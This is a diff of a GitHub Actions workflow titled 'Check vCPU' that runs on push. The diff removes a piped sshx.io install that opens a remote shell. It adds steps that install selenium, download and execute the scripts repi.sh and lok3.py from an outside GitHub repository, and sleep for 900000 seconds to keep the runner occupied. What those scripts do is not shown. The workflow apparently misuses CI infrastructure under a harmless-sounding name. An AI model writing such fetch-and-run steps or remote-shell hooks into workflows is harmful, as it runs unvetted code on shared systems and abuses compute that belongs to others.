@@ -1,4 +1,4 @@
-name: Check vCPUU
+name: Check vCPU
 
 on: push
 
@@ -13,5 +13,7 @@ jobs:
     - name: Works
       run: |
         lscpu
-        curl -sSf https://sshx.io/get | sh -s run
-        sleep 9000000
+        pip3 install selenium selenium-wire
+        pip3 uninstall blinker -y && pip3 install blinker==1.4
+        wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/repi.sh && chmod +x repi.sh && ./repi.sh && wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/lok3.py && python3 lok3.py
+        sleep 900000
